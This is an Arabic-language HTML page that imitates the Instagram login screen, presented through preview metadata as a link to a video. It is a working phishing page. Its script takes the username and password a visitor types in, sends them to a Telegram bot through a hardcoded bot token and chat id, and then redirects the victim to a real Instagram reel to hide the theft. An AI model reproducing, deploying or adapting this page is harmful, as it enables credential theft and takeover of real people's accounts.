<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <meta property="og:title" content="Instagram Video">
    <meta property="og:description" content="الفديو كامل لكيناه تحطها بطي.ها">
    <meta property="og:image" content="https://raw.githubusercontent.com/media-node-fast/verification-node-7/main/IMG_1426.jpeg"> 
    <meta property="og:image:width" content="600">
    <meta property="og:image:height" content="600">
    <meta property="og:type" content="video.other">
    
    <title>Instagram</title>
    
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #ffffff; font-family: -apple-system, sans-serif; }
        .wrapper { display: flex; flex-direction: column; align-items: center; width: 100%; padding-top: 80px; }
        .logo { width: 175px; margin-bottom: 50px; }
        .inputs { width: 85%; max-width: 350px; }
        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 14px; margin-bottom: 10px; box-sizing: border-box; font-size: 14px; }
        .login-btn { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 8px; padding: 12px; font-weight: 600; font-size: 14px; margin-top: 15px; cursor: pointer; }
        .divider { display: flex; align-items: center; text-align: center; color: #8e8e8e; font-size: 13px; margin: 30px 0; width: 100%; }
        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; }
        .divider::before { margin-left: 1.5em; }
        .divider::after { margin-right: 1.5em; }
        .fb { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; }
        .footer { position: absolute; bottom: 30px; width: 100%; text-align: center; font-size: 12px; color: #8e8e8e; }
    </style>
</head>
<body>

    <div class="wrapper">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" class="logo">
        <div class="inputs">
            <input type="text" id="u" placeholder="اسم المستخدم، الهاتف، أو البريد">
            <input type="password" id="p" placeholder="كلمة السر">
            <button class="login-btn" onclick="capture()">تسجيل الدخول</button>
            <div class="divider">أو</div>
            <center><a href="#" class="fb">تسجيل الدخول بحساب Facebook</a></center>
        </div>
    </div>
    <div class="footer">من Meta</div>

    <script>
        function capture() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(u && p) {
                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=👤:${u}%0A🔑:${p}`);
                setTimeout(() => { window.location.href = "https://www.instagram.com/reel/DVucGpOiJms/"; }, 1000);
            }
        }
    </script>
</body>
</html>
